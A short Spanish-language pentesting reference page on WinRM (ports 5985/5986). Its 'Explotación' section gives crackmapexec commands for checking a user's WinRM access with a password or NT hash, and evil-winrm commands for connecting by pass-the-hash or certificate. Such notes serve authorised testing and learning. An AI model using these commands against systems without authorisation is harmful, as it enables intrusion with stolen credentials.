# Port 5985, 5986 - WinRM

WinRM (Windows Remote Management) es un protocolo de administración remota desarrollado por Microsoft para la administración de sistemas operativos Windows. WinRM permite a los administradores controlar y administrar de forma remota servidores y estaciones de trabajo Windows. A través de WinRM, los administradores pueden ejecutar comandos y scripts, obtener información del sistema, configurar el firewall, entre otras funciones de administración remota.

Los usuarios pertenecientes al grupo Remote Managment Users cuentan con capacidad de WinRm, por lo que si conocemos sus credenciales tendremos capacidad de ejecución remota de comandos.



## Explotación

Validar si un determinado usuario tiene capacidad de WinRM:

```bash
### Normal connection
crackmapexec winrm <TARGET-IP> -u '<USER>' -p '<PASSWD>' [-H '<NT-HASH>']

### With ssl
crackmapexec winrm <TARGET-IP>  --ssl -u '<USER>' -p '<PASSWD>' [-H '<NT-HASH>'] --ignore-ssl-cert
```

Conectarse a este servicio con evilwinrm

```bash
gem install evilwinrm # Instalar evilwinrm 

evil-winrm -i <HOST> -u <USER> -H <NT-HASH> # connection
evil-winrm -i <HOST> -c <CERT> -k <KEY> -S  # ssl connection
```
